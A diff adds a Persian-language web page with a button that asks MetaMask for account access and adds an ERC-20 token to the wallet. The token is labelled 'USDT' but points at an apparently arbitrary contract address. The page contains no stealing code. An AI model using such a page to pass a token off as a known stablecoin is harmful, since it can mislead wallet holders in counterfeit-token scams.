@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>افزودن توکن به MetaMask</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    button {
+      background-color: #f6851b;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #e2761b;
+    }
+  </style>
+</head>
+<body>
+  <h2>افزودن توکن USDT به کیف‌پول MetaMask</h2>
+  <button onclick="addToken()">افزودن توکن</button>
+
+  <script>
+    async function addToken() {
+      if (!window.ethereum) {
+        alert('MetaMask نصب نیست.');
+        return;
+      }
+
+      try {
+        await ethereum.request({ method: 'eth_requestAccounts' });
+
+        const wasAdded = await ethereum.request({
+          method: 'wallet_watchAsset',
+          params: {
+            type: 'ERC20',
+            options: {
+              address: '0xF0E31Dd100c51405D7a4d61c863d2E5e98B2CC44', // آدرس توکن شما
+              symbol: 'USDT',
+              decimals: 18,
+              image: 'https://ipfs.io/ipfs/bafkreickdhlzaeajcyqpxopdolo57rfzkttbrlyfujo2sjszc22z3zohdu'
+            },
+          },
+        });
+
+        if (wasAdded) {
+          alert('✅ توکن با موفقیت اضافه شد.');
+        } else {
+          alert('❌ اضافه‌کردن توکن لغو شد.');
+        }
+      } catch (error) {
+        console.error(error);
+        alert('⚠️ خطا در افزودن توکن: ' + error.message);
+      }
+    }
+  </script>
+</body>
+</html>
